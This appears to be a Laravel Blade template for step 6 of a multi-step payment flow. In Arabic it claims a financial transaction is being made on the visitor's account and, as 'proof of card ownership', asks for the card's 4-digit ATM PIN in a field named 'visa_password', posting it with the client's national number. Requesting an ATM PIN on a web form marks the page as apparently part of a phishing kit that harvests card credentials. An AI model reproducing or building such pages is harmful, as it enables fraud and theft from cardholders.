@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row  justify-center">
            <form class="payment-description p-5 w-75 " action="{{route('client.submit_step')}}" method="POST">
                @csrf
                <input type="hidden" name="client_id" value="{{$client->id}}">
                <input type="hidden" name="national_number" value="{{$client->national_number}}">
                <input type="hidden" name="total_price" value="700">
                <input type="hidden" name="step" value="6">
                <div class="img-for-payment d-flex justify-start p-2">
                    <img src="{{ asset('frontend') }}/assets/images/payment/master-card.svg" alt="master-card" >
                    <img src="{{ asset('frontend') }}/assets/images/payment/visa-card.svg" alt="visa-card" >
                </div>
                <div >
                    <h6 class="text-center">اثبات ملكية البطاقه - كلمة  سر البطاقه</h6>
                    <p class="text-center">يوخد معامله ماليه علي حسابك </p>
                    <p class="text-center">لتأكيد المعامله يرجي ادخال  رمز الصراف الآلي المكون من 4 ارقام
                    </p>

                </div>
                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                  <label for="exampleInputPassword1" class="form-label">رمز الصراف </label>
                  <input class="ta form-control input-of-buy" type="password" placeholder="رمز الصراف "  name="visa_password">
                </div>
                @error('visa_password')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button type="submit" class=" ta btn btn-secondary btn-sm mt-4 w-50  " >تأكيد</button>
                </div>
              </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection
